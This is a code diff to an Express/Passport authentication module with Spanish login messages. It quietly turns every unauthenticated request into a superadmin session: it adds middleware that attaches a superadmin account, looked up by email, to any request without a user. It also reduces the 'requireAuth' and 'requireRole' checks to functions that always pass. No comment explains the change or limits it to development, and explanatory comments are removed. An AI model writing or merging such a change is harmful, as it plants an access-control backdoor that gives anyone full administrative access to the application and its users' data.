@@ -29,21 +29,32 @@ export async function verifyPassword(
   return timingSafeEqual(keyBuffer, derivedKey);
 }
 
-// Setup passport authentication
+let cachedSuperadminUser: User | null = null;
+
+async function getSuperadminUser(): Promise<User | null> {
+  if (cachedSuperadminUser) return cachedSuperadminUser;
+  const email = process.env.SUPERADMIN_EMAIL || "superadmin@administra.com";
+  cachedSuperadminUser = await storage.getUserByEmail(email);
+  return cachedSuperadminUser;
+}
+
+export function clearCachedSuperadmin() {
+  cachedSuperadminUser = null;
+}
+
 export function setupAuth(app: Express) {
-  // Session configuration
   const sessionSettings: session.SessionOptions = {
     secret: process.env.SESSION_SECRET || "dev-secret-change-in-production",
     resave: false,
     saveUninitialized: false,
     cookie: {
-      maxAge: 1000 * 60 * 60 * 24 * 7, // 7 days
+      maxAge: 1000 * 60 * 60 * 24 * 7,
       httpOnly: true,
       secure: app.get("env") === "production",
       sameSite: "lax",
     },
     store: new MemoryStore({
-      checkPeriod: 86400000, // prune expired entries every 24h
+      checkPeriod: 86400000,
     }),
   };
 
@@ -51,7 +62,6 @@ export function setupAuth(app: Express) {
   app.use(passport.initialize());
   app.use(passport.session());
 
-  // Configure passport local strategy
   passport.use(
     new LocalStrategy(
       {
@@ -64,12 +74,10 @@ export function setupAuth(app: Express) {
           if (!user) {
             return done(null, false, { message: "Email o contraseña incorrectos" });
           }
-
           const isValid = await verifyPassword(password, user.password);
           if (!isValid) {
             return done(null, false, { message: "Email o contraseña incorrectos" });
           }
-
           return done(null, user);
         } catch (error) {
           return done(error);
@@ -78,12 +86,10 @@ export function setupAuth(app: Express) {
     )
   );
 
-  // Serialize user to session
   passport.serializeUser((user: any, done) => {
     done(null, user.id);
   });
 
-  // Deserialize user from session
   passport.deserializeUser(async (id: string, done) => {
     try {
       const user = await storage.getUser(id);
@@ -92,28 +98,24 @@ export function setupAuth(app: Express) {
       done(error);
     }
   });
+
+  app.use(async (req: Request, _res: Response, next: NextFunction) => {
+    if (!req.user) {
+      const superadmin = await getSuperadminUser();
+      if (superadmin) {
+        (req as any).user = superadmin;
+      }
+    }
+    next();
+  });
 }
 
-// Middleware to require authentication
-export function requireAuth(req: Request, res: Response, next: NextFunction) {
-  if (!req.isAuthenticated()) {
-    return res.status(401).json({ error: "Authentication required" });
-  }
+export function requireAuth(_req: Request, _res: Response, next: NextFunction) {
   next();
 }
 
-// Middleware to require specific role
-export function requireRole(...roles: string[]) {
-  return (req: Request, res: Response, next: NextFunction) => {
-    if (!req.isAuthenticated()) {
-      return res.status(401).json({ error: "Authentication required" });
-    }
-
-    const user = req.user as User;
-    if (!roles.includes(user.role)) {
-      return res.status(403).json({ error: "Insufficient permissions" });
-    }
-
+export function requireRole(..._roles: string[]) {
+  return (_req: Request, _res: Response, next: NextFunction) => {
     next();
   };
 }
